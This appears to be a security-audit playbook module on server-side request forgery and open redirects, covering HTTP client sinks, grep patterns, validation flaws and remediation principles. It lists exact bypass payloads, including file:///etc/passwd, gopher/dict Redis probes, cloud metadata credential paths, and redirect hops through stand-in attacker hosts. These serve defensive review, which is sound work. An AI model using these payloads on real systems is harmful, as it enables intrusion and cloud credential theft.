---
name: aegis-ssrf-url-security
description: Audit playbook module for server-side request forgery (CWE-918) and open-redirect failures (CWE-601), covering user-influenced URLs fetched by servers, sink catalogs across all mainstream HTTP client libraries, redirect/DNS/parser filter bypasses, cloud metadata and orchestration-endpoint exposure, and allowlist-plus-pinning remediations.
category_slug: SSRF
cwe: [CWE-918, CWE-601]
owasp: A10:2021 – Server-Side Request Forgery
---

## Scope & Objectives

### Objective

Audit every code path where the server issues an outbound network request whose destination is influenced by user input, and every code path where the server tells a browser to navigate to a user-influenced URL. For each finding produce: file:line evidence of source-to-sink flow, the exact validation gap (none, bypassable, or post-validation), a static-first reproduction recipe, a severity with rationale, and a framework-correct fix built on parse-validate-pin-revalidate.

### In Scope

| Class | Typical finding | Primary CWE |
|---|---|---|
| Classic SSRF | `url` parameter fetched with `requests.get()` / `fetch()` / `http.Get()` with no host validation; internal hosts reachable | CWE-918 |
| Partial SSRF / filter-bypass SSRF | Scheme or hostname allowlist defeated by IP encodings (`2130706433`), userinfo tricks (`http://trusted@169.254.169.254/`), backslash parsing splits, alternate IPv6 forms | CWE-918 |
| Redirect-following amplification | Allowlist checked on the original URL, then 3xx hops followed to internal/metadata hosts unvalidated | CWE-918 |
| DNS-rebinding TOCTOU | Hostname resolved once during validation, resolved again (or re-resolved) at connect time to an attacker-controlled private address | CWE-350, CWE-918 |
| Blind/timing SSRF | Response body not returned, but reachability of arbitrary hosts proven via timing, error differentials, or out-of-band callbacks | CWE-918 |
| Cloud metadata exposure | Fetch surface reaches `169.254.169.254` / `fd00:ec2::254` (AWS IPv6 metadata) / `metadata.google.internal`; IMDSv1 vs v2 gate differences determine exploitability | CWE-918 |
| Orchestration/internal service exposure | k8s API via `KUBERNETES_SERVICE_HOST`, Docker socket via scheme abuse, Redis/RabbitMQ/actuator probing through the fetch primitive | CWE-918 |
| Open redirect (server-set Location) | `Location:` header built from `next=`/`returnTo=` input; allowlists defeated by `//evil.com`, `\evil.com`, suffix matches, `@` credentials | CWE-601 |
| Client-side redirect primitives | `<meta http-equiv="refresh">`, `location = userInput`, `location.replace(userInput)` emitted from server templates | CWE-601 |

### Out of Scope (cross-references)

- OAuth/OIDC `redirect_uri` semantics and authorization-code interception -> AUTHN module. Flag only that this module's open-redirect findings can chain into OAuth flows.
- Exposure of Spring Boot actuator, RabbitMQ management UI, and similar admin endpoints as standalone misconfigurations -> CONFIG module. This module treats them as targets reachable through an SSRF primitive.
- Absence/strength of webhook HMAC signatures -> CRYPTO module. Note here only when unsigned webhooks make an SSRF finding a persistent exfiltration channel.
- XXE-driven internal fetches (external entity resolution) -> DESER module. Flag the accepting endpoint here only if it also takes plain URLs.
- Browser-side `<img src>` pointing at internal URLs (no server fetch involved) -> WEB module. Include only when the server itself retrieves the asset.
- Egress firewall rule quality inside IaC -> CONFIG module for full review; this module records whether egress controls exist as defense-in-depth.

### Operating Assumptions

Read-only access to the repository; no running instance is guaranteed. Dynamic reproduction is optional and permissible only against explicitly authorized environments. Static confirmation — tracing `param -> validation -> client.execute(...)` — is sufficient evidence for reporting; dynamic procedures in this module are written so they never print live secrets unredacted.

## Prerequisites & Vocabulary

Zero-background primer: the terms this module uses, one line each. Deeper plain-language
explanations for every class live in the repository GUIDE.md glossary.

- **SSRF**: tricking the server into sending requests the attacker chooses, from inside its own network
- **metadata endpoint**: an address reachable only from the server itself that hands out cloud role credentials
- **redirect chain**: a fetch following redirect hops; every hop needs fresh validation
- **DNS rebinding**: a hostname resolving to a safe IP during checks and to an internal IP at connect time
- **blind SSRF**: the response stays hidden but reachability is still provable via timing, errors, or callbacks
- **open redirect**: the server sending users to attacker-chosen URLs built from request input
- **egress filtering**: network rules limiting which outside destinations the server may contact
- **taint flow / source→sink**: path untrusted data travels from entry point to dangerous function
- **finding status**: Confirmed > Probable > Needs-Review; evidence rules in templates/finding-report.md

## Mental Model

### The Fetch Is a New Trust Boundary

When the server makes the request, the request originates from the server's network position: inside the VPC, inside the pod, next to the metadata service, holding cloud IAM role assumptions. A URL submitted by an attacker is therefore not "a string" — it is a delegation of the server's network identity. The audit question is never "can the user supply a URL?" but "what can the server reach on the user's behalf that the user could not reach alone?"

### Four Layers Decide Exploitability

Every SSRF candidate decomposes into four layers; find the first layer where control is lost:

1. **Source**: which fields feed the destination (query param, JSON body, webhook config row, SSO issuer setting).
2. **Validation**: what stands between input and sink — scheme check? host allowlist? resolved-IP check? Which URL parser does the validator use?
3. **Resolution**: which IP the connection actually uses. Validation resolves once; the client may resolve again (DNS rebinding window), or redirects introduce fresh names/IPs after validation.
4. **Transport**: which schemes the client honors (`file://`, `gopher://`, `dict://`), how many redirects it follows, whether it forwards credentials.

A finding exists if any layer fails. Most real bugs are layer-2 (parser mismatch) or layer-3 (redirect/rebinding) failures behind code that *looks* validated.

### Parser Mismatch Is the Root of Most Bypasses

Each evasion payload in this module exploits one disagreement between the validator's view of the URL and the HTTP library's view:

- **userinfo vs host**: validator string-matches the prefix `https://trusted.com` but the client connects to the host after the `@`.
- **backslash**: WHATWG-style parsers treat `\` as `/` in special schemes (`http:\\host`, `/\host`); strict parsers reject or keep it, so validator and sink disagree.
- **IP literal forms**: `127.0.0.1`, `0x7f000001`, `017700000001`, `2130706433`, `127.1`, `0` are all loopback-family addresses to a compliant resolver but only one form to a naive regex.
- **IPv6**: `[::1]`, `[::ffff:127.0.0.1]` (IPv4-mapped), `fc00::/7` ULA, link-local `fe80::` — validators checking dotted quads miss all of these.
- **late decoding**: double-encoded `%252F` / `%3A%2F%2F` decoded after validation but before dispatch.

Treat any hand-written URL validation (regex, `startsWith`, substring search) as presumed bypassable until proven otherwise against the actual sink library's parser.

### Redirects Reset the Rules

An allowlist evaluated once protects exactly one request. If the client follows redirects (most do by default — see sink table), every `3xx` hop is a brand-new destination that skipped validation entirely. The canonical amplification: validate `https://attacker.tld`, follow its `302` to `http://169.254.169.254/latest/meta-data/`.

### Resolution Is a Second Clock

DNS rebinding is the same failure across time instead of hops: the validator resolves `attacker.tld` to a public IP (allow passes), the client later connects to the *re-resolved* address, now `169.254.169.254` or `10.0.0.5`, because attacker DNS uses TTL 0. Any design that validates DNS names without pinning the validated address owns a rebinding window.

### Blind Still Counts

Many sinks discard the response body (webhook pings, importers, PDF renderers fetching assets). Reachability remains provable: connect-refused returns instantly, filtered hosts hang until timeout, live services return distinguishable status/error text, and attacker-controlled DNS/log collators receive callbacks. Blind SSRF supports port scanning and metadata confirmation even when bodies are hidden.

### Metadata Turns Local Reach into Cloud Takeover

`169.254.169.254` answers from the instance itself. AWS IMDSv1 responds to a plain GET — any SSRF reads role credentials. IMDSv2 requires a PUT-obtained token plus token header, which defeats GET-only SSRF clients but not clients where method and headers are controllable, and its hop limit of 1 blocks container-to-host relays. GCP requires `Metadata-Flavor: Google`, Azure requires `Metadata: true` plus `api-version` — header-gated, not method-gated. An SSRF that lets you set headers crosses all of them.

## What To Check

### 1. Enumerate Every Outbound-Fetch Feature

Inventory features whose purpose is "server retrieves a URL" or "server sends a request to a configured destination":

- Webhook configurators (delivery URL stored per tenant, ping/test buttons).
- Link-preview / unfurlers (chat, comment rich previews).
- Import-from-URL (CSV/JSON/zip importers, RSS/feed readers, calendar subscriptions).
- Document/PDF/image renderers pulling remote assets (`wkhtmltopdf`, Puppeteer/Playwright `page.goto`, `<img src>` rewritten server-side).
- Image/avatar proxies and resizers (`?url=`, `?src=`, `?image=`).
- SSO/OIDC discovery and issuer URLs (admin-settable `issuer`, `well-known` endpoints).
- Integration settings: Slack/Jira/Teams webhook URLs, callback URLs in OAuth app registrations.
- Legacy `file=`, `template=`, `include=` parameters that reach fetch primitives.

For each feature, record the route, the handler file, and the storage row that persists the destination.

### 2. Trace Each Feature From Input to Sink

Follow the value end-to-end before judging safety: parameter -> decode steps -> parse -> validation function -> HTTP client call. Record:

- Which parser each side uses (validator's parser vs client library's parser).
- Whether the validator sees the raw string or a re-encoded one.
- Whether the check runs once or per hop / per connection.

A check on a different representation than the sink uses is equivalent to no check.

### 3. Audit the Validation Logic Itself

- Scheme allowlist present, and is it exactly `{https}`? Anywhere accepting `file`, `gopher`, `dict`, `ftp`, `unix`, or arbitrary schemes is a finding.
- Host allowlist: exact-match against parsed hostname (lowercased, IDNA-normalized), never suffix/`endsWith`/`contains` matching; reject userinfo entirely.
- Resolved-IP policy: are ALL resolved addresses (all address records) checked against private/link-local/loopback/ULA ranges at request time?
- Port restrictions for non-standard-port integrations.
- Literal IP inputs: rejected outright or range-checked?

### 4. Check Redirect Handling

- Find the client's redirect default from the sink table (most default to following).
- If redirects are enabled, is there per-hop revalidation (`CheckRedirect`, `maxRedirects` + hook, manual loop)? Absence = the pre-fetch allowlist protects only hop zero.
- Confirm the code does not merely raise `maxRedirects` — count caps without revalidation still land on metadata.

### 5. Check Scheme Support and Protocol Locks

- PHP curl: are `CURLOPT_PROTOCOLS` / `CURLOPT_REDIR_PROTOCOLS` pinned to `CURLPROTO_HTTPS`?
- Python `urllib.request`: native `ftp://` and `file://` support means any use of it with remote input is scheme-abuse-capable.
- Node `fetch`: http/https only; but wrapper utilities sometimes pass through custom agents/schemes — verify.
- PDF pipelines: `wkhtmltopdf` flags like `--enable-local-file-access`, Puppeteer navigating `file://` URLs embedded by users.

### 6. Check Cloud Metadata Hardening

- Search IaC/Terraform for instance metadata options: is `http_tokens = "required"` (IMDSv2 enforced) and `http_put_response_hop_limit = 1` set, or absent (= IMDSv1 reachable)?
- Note header-gated providers (GCP/Azure): their headers do NOT stop SSRF where the attacker controls headers; treat as reachable if the sink forwards attacker headers.

### 7. Check Container/Orchestration Reachability

- Is the fetch surface deployed in k8s (manifests, Helm charts in repo)? Then `KUBERNETES_SERVICE_HOST` + serviceaccount token make the API server an internal target; check whether pods get tokens auto-mounted and whether RBAC would matter.
- Any place user-supplied URLs can select a socket path or exotic scheme near Docker (`unix:///var/run/docker.sock`) — rare but catastrophic; note scheme handling.
- Internal admin panels reachable from pod network: actuator endpoints, RabbitMQ management `:15672`, Consul `:8500`, Redis `:6379`.

### 8. Audit Open-Redirect Surfaces

- Grep every writer of `Location`, every `redirect()` helper call fed from request params (`next`, `returnTo`, `continue`, full grep list in Patterns).
- Examine the validation: same-origin enforcement must parse, compare hostnames exactly, and handle protocol-relative (`//evil.com`) and backslash forms; anything else is bypassable.
- Server-emitted meta-refresh tags and inline JS `location` assignments built from template variables.
- Redirect allowlists implemented as suffix match (`endsWith("trusted.com")` matches `eviltrusted.com`), prefix match, or substring containment.
- Chains: app redirector -> second open redirector -> attacker; each hop multiplies phishing credibility.

### 9. Note Webhook Signature Absence

When a webhook delivery feature both (a) accepts tenant-controlled URLs and (b) delivers payloads without HMAC signatures, record the combination: SSRF to attacker infrastructure plus replay of sensitive payload contents. Cross-reference CRYPTO module for signature design; do not redesign it here.

### 10. Confirm Egress Controls Exist (Defense-in-Depth)

Look for evidence in repo/IaC: NetworkPolicy egress denies to RFC1918/metadata, NAT gateways without public egress, dedicated fetch proxies, iptables rules rejecting `169.254.169.254`. Their presence lowers severity; their absence raises it. Never let a network control substitute for fixing the application-layer gap in the report.

## Where To Look

### Feature-Level Entry Points

Search controllers/routes/handlers first, then follow into service layers. High-yield names: `webhook`, `callback`, `ping`, `preview`, `unfurl`, `import`, `proxy`, `avatar`, `thumbnail`, `render`, `export`, `pdf`, `screenshot`, `feed`, `rss`, `discovery`, `issuer`, `metadata`, `callback_url`, `target_url`.

### Polyglot Sink Catalog

| Language | Library/API | Dangerous call | Notes |
|---|---|---|---|
| Python | requests | `requests.get(url)`, `Session.request(url)` | Follows redirects by default (`allow_redirects=True`); http/https only |
| Python | httpx | `httpx.get(url)`, `Client().stream(...)` | Does NOT follow redirects unless `follow_redirects=True`; http/https only |
| Python | urllib3 | `PoolManager().request("GET", url)` | Follows redirects up to `Retry(redirect=3)` default; http/https only |
| Python | aiohttp | `ClientSession().get(url)` | Follows redirects by default (`allow_redirects=True`, max 10); http/https only |
| Python | urllib.request | `urlopen(url)` | Follows redirects; **native support for `ftp://` and `file://`** — scheme abuse capable |
| Python | pycurl | `curl.setopt(URL, u)` | Honors libcurl protocols incl. `gopher://`, `dict://`, `tftp://` unless `CURLOPT_PROTOCOLS` locked |
| Node | undici/global `fetch` | `fetch(u)` (Node >= 18) | Follows up to 20 redirects; http/https only |
| Node | axios | `axios.get(u)` | Node adapter follows up to 5 redirects by default; browser adapter lets browser follow |
| Node | got | `got(u)` | Follows redirects by default |
| Node | node-fetch | `nodeFetch(u)` | Follows up to 20 redirects by default (`follow: 20`) |
| Node | request (deprecated) | `request({uri: u})` | `followRedirect: true` default |
| Node | needle | `needle.get(u)` | Verify vendored version's `follow_max`; historically follows when `follow` option set |
| Node | http/https core | `http.request(u)` / `http.get(u)` | No auto redirect following (manual only); raw sockets otherwise |
| Java | HttpURLConnection | `new URL(u).openConnection()` | `instanceFollowRedirects=true` default; follows same-scheme hops only |
| Java | OkHttp | `OkHttpClient().newCall(Request(u))` | `followRedirects(true)` and `followSslRedirects(true)` defaults |
| Java | Apache HttpClient | `HttpClientBuilder` / `HttpClients.createDefault()`, `HttpGet(u)` | Follows redirects by default (LAX strategy) |
| Java | Spring RestTemplate | `restTemplate.getForObject(u, ...)` | Delegates to factory; SimpleClientHttpRequestFactory inherits HttpURLConnection redirect behavior |
| Java | Spring WebClient | `WebClient.create().uri(u)` | Reactor Netty default does not follow redirects unless `.followRedirect(true)` configured; verify project config |
| Java | Jsoup | `Jsoup.connect(u)` | Follows redirects by default (HTML fetcher) |
| .NET | HttpClient | `client.GetAsync(u)`, `SendAsync(msg)` | `AllowAutoRedirect=true` handler default |
| .NET | WebClient (legacy) | `webClient.DownloadString(u)` | Follows redirects by default |
| .NET | WebRequest/HttpWebRequest | `WebRequest.Create(u).GetResponse()` | `AllowAutoRedirect=true` default |
| .NET | RestSharp | `client.Execute(request)` | Follows redirects by default; http/https only |
| PHP | ext/curl | `curl_init($u)` + `curl_exec` | `CURLOPT_FOLLOWLOCATION` off by default BUT frequently enabled; protocols unrestricted until `CURLOPT_PROTOCOLS` pinned; libcurl honors `gopher://`/`dict://`/`ftp://` |
| PHP | wrappers | `file_get_contents($u)`, `fopen($u)`, `readfile($u)` | With `allow_url_fopen=On`: follows redirects (default limit 20), supports `http(s)/ftp/file/php/data` wrappers |
| PHP | Guzzle | `(new Client())->get($u)` | `allow_redirects` default max 5; http/https only |
| Ruby | Net::HTTP | `Net::HTTP.get(uri)`, `Net::HTTP.start { }` | Does NOT auto-follow redirects (manual only) — safe default worth stating in reports |
| Ruby | open-uri | `URI.open(u)`, `Kernel#open(u)` | Follows redirects; **accepts `file://`** — classic read-primitive when fed user input |
| Ruby | HTTParty | `HTTParty.get(u)` | Follows redirects by default (`follow_redirects: true`) |
| Ruby | RestClient | `RestClient.get(u)` | Follows redirects by default |
| Ruby | Faraday | `Faraday.new(url: u)` | No auto-follow unless `FaradayMiddleware::FollowRedirects` inserted; verify middleware stack |
| Ruby | Typhoeus | `Typhoeus.get(u)` | libcurl semantics; `followlocation` off by default |
| Go | net/http | `http.Get(u)`, `client.Do(req)` | Follows up to 10 redirects via default `CheckRedirect`; http/https only |

### Framework & Configuration Spots

| Location | What to inspect |
|---|---|
| Webhook/integration models & migrations | Columns like `webhook_url`, `callback_url`, `target_url`, `slack_webhook_url`, `jira_base_url`, `ping_url` — find the delivery code that consumes them |
| SSO/OIDC settings | Admin-editable `issuer`, `discovery_url`, `well_known_url` fields consumed by auth libraries at login time |
| Asset pipeline config | Image proxy upstreams, `IMGPROXY`, media resizer source URLs; PDF service base URLs |
| PDF/renderer invocation | `wkhtmltopdf` args (`--enable-local-file-access`), Puppeteer `page.goto(userUrl)` |
| Reverse proxy configs | `nginx.conf` `resolver`, internal `proxy_pass` variables derived from request data |
| Environment files | `ALLOWED_HOSTS`, `TRUSTED_PROXIES`, egress allowlists, proxy env vars (`HTTP_PROXY` injection via user input is also SSRF-by-config) |
| IaC (Terraform/CloudFormation/Helm) | Instance metadata options (`http_tokens`, hop limit), NetworkPolicy egress blocks, NAT/firewall rules |

### Repo Signals That Raise Suspicion

- A generic utility named `fetch_url`, `download`, `retrieve`, `http_client` used across features — audit it once, then map all callers.
- Comments mentioning "internal", "admin", "private network" near URL handling.
- Test fixtures containing `localhost`/`127.0.0.1` URLs feeding production-path clients.
## Patterns & Signatures

### Sink Greps Per Language

Run each line as an independent `rg -e` pattern. Expect noise; triage against the sink catalog above.

```regex
\b(requests|httpx|urllib3|aiohttp)\.(get|post|put|patch|delete|head|options|request|stream)\(
\ballow_redirects\s*=\s*(True|False)\b|\bfollow_redirects\s*=\s*(True|False)\b
\burllib\.request\.urlopen\s*\(|\brequest\.urlopen\s*\(
\bpycurl\.Curl\s*\(|CURLOPT_(URL|PROTOCOLS|REDIR_PROTOCOLS|FOLLOWLOCATION)
```

```regex
\bfetch\s*\(\s*[A-Za-z_$][A-Za-z0-9_$.]*
\baxios(\.(get|post|put|patch|delete|head|request))?\s*\(
\bgot\s*\(|\bnodeFetch\s*\(|\bneedle\.(get|post|head|request)\(
require\(['"]request['"]\)|\bmaxRedirects\b
```

```regex
new\s+URL\s*\(|\.openConnection\s*\(\)|\.openStream\s*\(
\bOkHttpClient\s*\(|HttpClients?\.(createDefault|create|custom)\b|\bHttpGet\s*\(|\bHttpPost\s*\(
new\s+RestTemplate\s*\(|restTemplate\.(getForObject|getForEntity|exchange|postForObject)
WebClient\.(create|builder)\(|Jsoup\.connect\s*\(
setFollowRedirects|instanceFollowRedirects|followRedirects\s*\(
```

```regex
new\s+(HttpClient|WebClient|SocketsHttpHandler|RestClient)\s*\(
(GetStringAsync|GetAsync|GetStreamAsync|GetByteArrayAsync|PostAsync|PutAsync|SendAsync|DownloadString|DownloadFile|UploadString|UploadValues)\s*\(
WebRequest\.(Create|CreateDefault)\s*\(|AllowAutoRedirect\s*=
```

```regex
curl_init\s*\(|curl_setopt\s*\(|curl_exec\s*\(
file_get_contents\s*\(|\bfopen\s*\(|readfile\s*\(|fsockopen\s*\(
GuzzleHttp\\Client|\$client->(get|post|put|request|send)\(
allow_url_fopen|CURLOPT_FOLLOWLOCATION|CURLOPT_PROTOCOLS|CURLOPT_REDIR_PROTOCOLS
```

```regex
Net::HTTP\.(get|post|start)\b|Net::HTTP\.new\s*\(
URI\.open\s*\(|require\s+["']open-uri["']|\bopen\s*\(\s*[A-Za-z_$]
Faraday\.new|HTTParty\.(get|post)\b|RestClient\.(get|post)\b|Typhoeus\.(get|post)\b
follow_redirects|:followlocation
```

```regex
http\.(Get|Post|PostForm|Head)\s*\(
http\.NewRequest\s*\(|\bclient\.Do\s*\(
CheckRedirect|NewSingleHostReverseProxy|net\.Dialer\{
```

### Source & Parameter Greps

```regex
(webhook|callback|ping)[_-]?url
(import|preview|unfurl|render|proxy|avatar|thumbnail|icon|favicon|feed|rss|screenshot|pdf|discovery|issuer|upstream|remote|asset|image|src|source|target|dest|destination|file|path)[_-]*(url|uri|host|endpoint)
(getParameter|getParameterValues|queryParam|param|args\.get|searchParams\.get|request\.GET|request\.args)\s*\(?\s*["'](url|uri|u|target|src|file|path|next|redirect|continue)["']
```

Open-redirect parameter names (query-string form):

```regex
[?&"](next|to|continue|continueTo|dest|destination|goto|go|target|targetUrl|return|returnUrl|return_to|returnTo|rUrl|rurl|rUri|redirect|redirectTo|redirect_to|redirect_uri|redirectUrl|forward|fwd|callback|cb|link|out|exit|view|success_url|cancel_url|checkout_url|oauth_callback)="?(https?:|%2F%2F|//|/\\\\|https?:\\\\)?
```

Client-side redirect primitives:

```regex
<meta[^>]*http-equiv=["']?refresh
window\.location\s*=|window\.location\.href\s*=|document\.location(\.href)?\s*=
location\.(replace|assign)\s*\(|\blocation\s*=\s*
Response\.Redirect\s*\(|res\.redirect\s*\(|redirect\s*\(\s*request\.
```

Weak-validator smells (hand-rolled checks presumed bypassable):

```regex
startsWith\(\s*["'](http|https)://|indexOf\(["'](localhost|127\.0\.0\.1|internal)["']\)
endsWith\(\s*["'][a-z0-9.-]+\.[a-z]{2,}["']\)|includes\(["'](localhost|127\.|192\.168|169\.254)["']\)
match\(\/(127\.|10\.|192\.168\.|172\.16)\b|new RegExp\(["'].*(allowlist|whitelist|trusted)
```

### URL Filter-Evasion Ladder (Exact Strings)

Feed candidates in order; stop expanding once one tier proves the filter's blind spot. Comments annotate intent — send the bare string.

```text
# Tier 1 - direct literals (baseline: does ANY check exist?)
http://127.0.0.1:8080/
http://localhost:9000/
http://[::1]/
http://0.0.0.0/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://169.254.169.254/latest/meta-data/

# Tier 2 - numeric encodings of 127.0.0.1 (defeats dotted-quad regexes)
http://2130706433/
http://0x7f000001/
http://017700000001/
http://0177.0.0.1/
http://127.1/
http://127.0.1/
http://0/

# Tier 3 - public DNS resolving to loopback/private (defeats "block literal IPs only")
http://127.0.0.1.nip.io/
http://www.localtest.me/
http://<your-controlled-domain>.example.com   # attacker A record -> 10.x / 169.254.x is impossible for 169.254 but valid for RFC1918 targets

# Tier 4 - parser confusion between validator and sink
http://trusted.example.com@169.254.169.254/          # userinfo: validator matches prefix, client dials the host after @
http://169.254.169.254#@trusted.example.com/         # fragment masks host from naive string checks
http://trusted.example.com%2F@169.254.169.254/
http://169.254.169.254\@trusted.example.com/         # backslash+@ splits parsers
http:/\/169.254.169.254/
http:\169.254.169.254\
https%3A%2F%2F169.254.169.254%2F                     # double-encoded scheme/host
http://169。254。169。254/                            # ideographic dots (IDNA fold probe)
http://①②⑦.⓪.⓪.①/                                  # circled digits (NFKC fold probe)
http://[fe80::1%25eth0]/                             # IPv6 zone-id escape probe

# Tier 5 - scheme abuse (only when scheme not locked to https)
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO%0d%0aQuit%0d%0a        # historical Redis probe via libcurl
dict://127.0.0.1:6379/INFO
ftp://10.0.0.9/
tftp://10.0.0.9/x

# Tier 6 - scoped/internal IPv6 ranges (defeats IPv4-only range checks)
http://[fc00::1]/
http://[fe80::1]/
```

Tier-3 note: nip.io/sslip.io style services exist purely as DNS maps (`127.0.0.1.nip.io` -> A `127.0.0.1`); they defeat validators that block literal IPs but trust "domains". Tier-4 unicode probes test whether the stack folds non-ASCII before validation — record observed behavior, do not assume.

### Cloud Metadata Endpoint Cheat-Sheet

| Provider | Endpoint | Required method/headers | High-value paths | Redacted success shape |
|---|---|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | plain GET, no headers | `iam/security-credentials/<role>`, `user-data`, `identity-credentials/ec2/security-credentials/ec2-instance` | `{"Code":"Success","AccessKeyId":"ASIA…REDACTED","SecretAccessKey":"…REDACTED","Token":"…REDACTED","Expiration":"…"}` |
| AWS IMDSv2 | `PUT http://169.254.169.254/latest/api/token` then GETs | PUT with header `X-aws-ec2-metadata-token-ttl-seconds: 21600`; every GET carries `X-aws-ec2-metadata-token: <token>` | same paths as v1 | token response is opaque text; credential shape identical to v1 |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` (or 169.254.169.254) | header `Metadata-Flavor: Google` on every request | `instance/service-accounts/default/token`, `instance/service-accounts/default/aliases`, `project/project-id` | `{"access_token":"ya29.…REDACTED","expires_in":3599,"token_type":"Bearer"}` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | header `Metadata: true` + `api-version` query param | `metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | instance doc JSON (subscriptionId REDACTED); token reply `{"access_token":"eyJ0eXAi…REDACTED","expires_in":"85799",...}` |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | none (link-local only) | `/metadata/v1/hostname`, `/metadata/v1/id`, `/metadata/v1/interfaces/public/0/ipv4/address` | flat JSON of droplet facts (no long-lived creds) |
| Linode | `PUT http://169.254.169.254/v1/token` then GET | PUT with header `Metadata-Token-TTL-Seconds`; GET with `Metadata-Token: <token>` | `/v1/instance`, `/v1/network` | instance metadata JSON (no cloud credentials by default) |
| Oracle | `http://169.254.169.254/opc/v2/instance/` | header `Authorization: Bearer Oracle` | `/opc/v2/instance/canonicalRegionName`, `/opc/v2/instance/compartmentId` | instance facts JSON |

Exploitability logic to state in reports: **IMDSv1 = any GET-only SSRF reads role credentials. IMDSv2 = requires attacker control of method (PUT) plus a custom header — blocked for GET-only sinks, unblocked where the sink forwards attacker headers/method.** GCP/Azure header gates behave like IMDSv2: defeated exactly when header control exists.

### Internal Target Cheat-Sheet (Post-SSRF Pivot)

| Target | Probe URL through sink | Signal |
|---|---|---|
| k8s API server | env `KUBERNETES_SERVICE_HOST` value, e.g. `https://10.96.0.1:443/version` | version JSON vs TLS/timeout error |
| Spring actuator | `http://<svc>:8080/actuator/env`, `/actuator/heapdump` | config dump (cross-ref CONFIG) |
| RabbitMQ management | `http://<host>:15672/api/overview` | JSON overview or login page |
| Redis | `dict://<host>:6379/INFO` or timing on raw TCP | INFO blob via gopher/dict historically |
| Consul | `http://<host>:8500/v1/kv/?keys` | key list |
| Prometheus/Grafana | `:9090/api/v1/status/buildinfo`, `:3000/api/health` | build JSON |
| Elasticsearch/OpenSearch | `:9200/` | cluster_name JSON |
| Docker daemon | `unix:///var/run/docker.sock` (scheme abuse only) | API JSON if honored |
| etcd | `:2379/version` | etcdserver version JSON |

Port-scan differentials: closed port => immediate refusal (fast, small error body); filtered/firewalled => hang to client timeout; open HTTP service => service-specific status/body. Bucket timings across `22,80,443,3000,3306,5432,6379,8000,8080,8443,8500,9090,9200,15672,27017`.

### Redirect-Bypass Sequences

```text
Sequence A - classic hop bypass:
  1. Submit https://app.example.com/fetch?url=https%3A%2F%2Fattacker.tld%2Frelay
     (allowlist sees attacker.tld if it is allowed, or the check passes on scheme alone)
  2. attacker.tld/relay responds:
       HTTP/1.1 302 Found
       Location: http://169.254.169.254/latest/meta-data/
  3. Client follows onto metadata; response (if returned) contains role name list.

Sequence B - rebinding TOCTOU:
  1. attacker.tld DNS: TTL 0, first answer 203.0.113.50 (public, allowlisted range)
  2. App validates hostname+resolved IP -> pass
  3. Client re-resolves at connect -> second answer 169.254.169.254 or 10.0.0.5

Sequence C - chained redirectors:
  app redirector -> any public open redirector/shortener -> internal URL
  (each hop re-hides the final destination from logs that capture only hop 0)

Sequence D - same-app loop for blind SSRF confirmation:
  point webhook/import at the app's own open-redirect endpoint whose Location
  is attacker-controlled -> converts "no outbound listener needed" into proof.
```

### Open-Redirect Payload Set

```text
next=https://evil.tld                       baseline
next=//evil.tld                             protocol-relative
next=///evil.tld                            triple slash (strips one "//" guard)
next=/\evil.tld    next=\/evil.tld          backslash confusion (\ treated as / by WHATWG/browsers)
next=https:/\evil.tld                       mixed slash forms
next=%2F%2Fevil.tld                         percent-encoded protocol-relative
next=https:%2F%2Fevil.tld                   encoded scheme
next=https:evil.tld                         legacy-parser probe (older stacks treat as authority)
next=https:/%evil.tld                       malformed-slash probe
next=https://trusted.com@evil.tld           userinfo trick (browser lands evil.tld)
next=https://trusted.com:443@evil.tld       userinfo with port
next=https://evil.tld#https://trusted.com   fragment masking (humans/log tools see trusted.com)
next=https://trusted.com.evil.tld           suffix-match bug exploitation
next=https://eviltrusted.com                endsWith("trusted.com") bug exploitation
next=https://trusted.com/.evil.tld          trailing-path probes against path-aware guards
next=//%2F%2Fevil.tld                       double-encoding layered on protocol-relative
next=https://%09evil.tld                    tab-prefixed host probe
```

Server-emitted equivalents to grep in templates:

```html
<meta http-equiv="refresh" content="0;url={{ user_input }}">
<script>window.location = "{{ user_input }}";</script>
<script>location.replace("{{ user_input }}");</script>
```
## Taint Tracing Guidance

### Identify the Sources

Treat as attacker-controlled unless provably operator-only:

- Request query params, path segments, JSON body fields, form fields, headers (`X-Forwarded-Host`, `Host`-derived URL builders, `Origin`-echoing builders).
- Persisted configuration writable by end users or tenants: webhook URLs, avatar/feed URLs, SSO issuer/discovery URLs, integration settings rows. "Admin-only" UI does not clear taint — record actor privilege instead.
- Message queues/event payloads that embed URLs from other tenants.
- NOT sources: compile-time constants, env vars set by deployment tooling, values read from server-side config files with no user write-path.

### Follow the Flow Through Normalization

At each hop between source and sink, note transformations: URL-decoding (`%252F` -> `%2F` -> `/`), IDNA/unicode folding, template escaping stripped later, reassembly of scheme+host+path into a fresh string. Any transformation applied *after* validation but *before* dispatch is itself a finding. Conversely, normalization applied before validation is only safe if the sink applies the identical normalization.

### Locate the Validator and Diff Its Semantics

Build this three-column comparison for each guarded flow:

| Question | Validator side | Sink side |
|---|---|---|
| Parser used? | regex / `startsWith` / `urlparse` / `new URL` / `java.net.URI` / `Uri.TryCreate` / `url.Parse` / `parse_url` | the client library's internal parser (see sink catalog) |
| Host extracted how? | `netloc.split("@")`? raw substring? parsed `.hostname`? | library authority parsing incl. userinfo handling |
| IP check on what? | first resolved address at validation time | addresses actually dialed per connection/hop |

Known parser-divergence facts to apply while diffing:

- WHATWG parsers (Node `URL`, browsers) treat `\` as `/` in special schemes; Python `urllib.parse` keeps `\`; Java `java.net.URI` rejects bare `\`. A Java-side validator plus a WHATWG-side consumer (or vice versa) disagrees on `http:\\host`.
- Userinfo: every mainstream parser places everything after the last `@` in the host; string-prefix validators do not.
- `hostname` properties lowercase; raw `netloc`/authority strings do not — case-based allowlists miss mixed-case bypasses.
- IPv4-mapped IPv6 and dword/octal/short forms parse to loopback-family addresses only in resolvers/parsers that canonicalize them; regexes almost never cover all forms.
- PHP `filter_var($u, FILTER_VALIDATE_URL)` validates syntax only — never treat its success as an allowlist match.

### Decide Vulnerability

Mark the flow vulnerable when any holds:

1. Destination reaches the client with no host-level validation.
2. Validation is representational only (regex/prefix/suffix) rather than parse+canonical-compare.
3. Validation runs once but redirects are followed without per-hop re-checks.
